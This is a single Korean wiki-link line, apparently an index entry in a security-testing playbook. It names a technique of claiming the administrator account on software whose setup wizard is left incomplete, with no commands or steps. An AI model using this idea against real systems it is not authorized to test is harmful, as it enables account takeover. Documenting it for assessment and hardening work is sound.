- [[_PLAYBOOK#B-1-47. 설정 마법사가 미완료면 관리자 계정을 «선점»할 수 있다]]
